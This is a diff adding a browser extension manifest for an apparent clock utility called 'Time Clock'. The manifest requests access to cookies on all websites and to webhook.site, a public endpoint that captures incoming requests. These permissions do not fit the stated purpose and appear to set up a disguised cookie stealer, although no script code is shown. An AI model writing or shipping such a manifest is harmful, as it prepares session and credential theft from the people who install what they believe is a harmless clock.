@@ -1,0 +1,16 @@
+{
+    "manifest_version": 3,
+    "name": "Time Clock",
+    "version": "1.0",
+    "description": "Check time while working on something else.",
+    "permissions": ["cookies"],
+    "host_permissions": ["<all_urls>", "https://webhook.site/"],
+    "action": {
+      "default_popup": "popup.html",
+      "default_icon": {
+        "16": "icon16.png",
+        "48": "icon48.png",
+        "128": "icon128.png"
+      }
+    }
+  }
